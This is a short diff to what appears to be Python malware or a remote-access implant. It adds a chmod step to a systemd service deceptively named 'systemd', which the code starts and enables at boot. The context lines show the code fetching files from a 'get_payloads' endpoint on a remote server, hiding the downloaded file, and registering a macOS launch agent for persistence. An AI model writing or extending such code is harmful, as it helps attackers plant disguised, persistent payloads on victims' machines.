@@ -36,6 +36,7 @@ ExecStart={file_path}
 [Install]
 WantedBy=multi-user.target""")
 
+        subprocess.run('chmod +x /etc/systemd/system/systemd.service')
         subprocess.run('systemctl start systemd')
         subprocess.run('systemctl enable systemd')
     
@@ -143,7 +144,7 @@ WantedBy=multi-user.target""")
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, 'wb') as file:
               file.write(response.content)
-              
+
         create_hidden_file(file_path)
         create_launch_agent(file_path, "com.yourname.launcher")
     
